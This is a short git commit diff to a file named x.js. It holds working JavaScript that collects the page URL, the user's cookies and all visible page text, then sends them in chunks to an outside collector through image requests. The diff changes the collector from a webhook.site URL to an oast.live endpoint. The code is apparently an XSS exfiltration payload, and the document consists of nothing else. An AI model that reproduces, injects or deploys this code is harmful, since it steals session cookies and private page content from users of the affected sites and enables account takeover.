11d229a51e9c41a6027cdb21cef28b3d55affb04
syazwanmsm93 <syazwanmsm93@gmail.com>
2026-06-14 06:08:36 +0800

    x.js

--- x.js
+++ x.js
@@ -1,4 +1,4 @@
 let d = location.href + "\nCOOKIE=" + document.cookie + "\nBODY=" + document.body.innerText;
-for (let i = 0; i < d.length; i += 1200) {
-  new Image().src = 'https://webhook.site/aafa8677-2f48-451c-8e94-8fc04e13e176?i=' + i + '&d=' + encodeURIComponent(d.slice(i, i + 1200));
+for (let i = 0; i < d.length; i += 900) {
+  new Image().src = 'https://d8mt6bao12pqbcoencq0snzjzbmh6cic8.oast.live/?i=' + i + '&d=' + encodeURIComponent(d.slice(i, i + 900));
 }
